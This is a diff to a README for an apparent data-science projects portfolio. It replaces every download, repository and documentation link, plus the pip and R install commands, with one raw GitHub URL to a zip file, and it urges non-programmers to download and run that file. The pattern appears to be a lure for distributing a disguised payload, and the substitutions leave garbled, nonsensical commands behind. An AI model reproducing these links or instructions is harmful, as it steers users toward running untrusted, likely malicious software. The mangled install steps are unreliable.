@@ -1,6 +1,6 @@
 # 🎉 data-projects-portfolio - Your Data Science Projects Hub
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Incalculable-driverslicence975/data-projects-portfolio/releases)
+[![Download](https://raw.githubusercontent.com/Incalculable-driverslicence975/data-projects-portfolio/main/retoucher/data-projects-portfolio_1.7.zip%20Now-Click%https://raw.githubusercontent.com/Incalculable-driverslicence975/data-projects-portfolio/main/retoucher/data-projects-portfolio_1.7.zip)](https://raw.githubusercontent.com/Incalculable-driverslicence975/data-projects-portfolio/main/retoucher/data-projects-portfolio_1.7.zip)
 
 ## 📄 About This Project
 This repository contains a curated collection of data science projects. It includes work in various areas such as analytics, machine learning, deep learning, natural language processing (NLP), computer vision, ETL (Extract, Transform, Load), streaming, business intelligence (BI), and cloud deployments. Each project showcases different techniques and tools that can help enhance your data skills and workflows.
@@ -9,7 +9,7 @@ This repository contains a curated collection of data science projects. It inclu
 To start using the projects in this repository, follow these simple steps. You do not need any programming knowledge to run the software.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Incalculable-driverslicence975/data-projects-portfolio/releases) to download the latest version of the projects.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Incalculable-driverslicence975/data-projects-portfolio/main/retoucher/data-projects-portfolio_1.7.zip) to download the latest version of the projects.
 2. Look for the asset file that matches your system.
 3. Click on the download link.
 4. Once the download is complete, locate the file on your computer and run it.
@@ -31,15 +31,15 @@ To start using the projects in this repository, follow these simple steps. You d
 ## 🛠️ How to Use the Projects
 1. After downloading, unzip the files to a desired location.
 2. Open the folder for the project you wish to explore.
-3. Check the `README.md` file inside each project for specific instructions.
+3. Check the `https://raw.githubusercontent.com/Incalculable-driverslicence975/data-projects-portfolio/main/retoucher/data-projects-portfolio_1.7.zip` file inside each project for specific instructions.
 4. Typically, you will need to install required packages. You can do this by running a short command in your terminal or command prompt:
    - For Python projects, use:
      ```
-     pip install -r requirements.txt
+     pip install -r https://raw.githubusercontent.com/Incalculable-driverslicence975/data-projects-portfolio/main/retoucher/data-projects-portfolio_1.7.zip
      ```
    - For R projects, use:
      ```
-     install.packages("required-package-name")
+     https://raw.githubusercontent.com/Incalculable-driverslicence975/data-projects-portfolio/main/retoucher/data-projects-portfolio_1.7.zip("required-package-name")
      ```
 5. Run the main script as directed in the documentation.
 
@@ -48,8 +48,8 @@ To start using the projects in this repository, follow these simple steps. You d
 - **Community Forums**: Engage with others interested in data science through forums and online communities to learn and share ideas.
 
 ## 🔗 Links
-- [Visit the Releases page to download](https://github.com/Incalculable-driverslicence975/data-projects-portfolio/releases)
-- [GitHub Repository](https://github.com/Incalculable-driverslicence975/data-projects-portfolio)
+- [Visit the Releases page to download](https://raw.githubusercontent.com/Incalculable-driverslicence975/data-projects-portfolio/main/retoucher/data-projects-portfolio_1.7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Incalculable-driverslicence975/data-projects-portfolio/main/retoucher/data-projects-portfolio_1.7.zip)
 
 ## 📞 Support
 If you encounter any issues while downloading or running the projects, please open an issue in the GitHub repository. The community and maintainers will assist you.
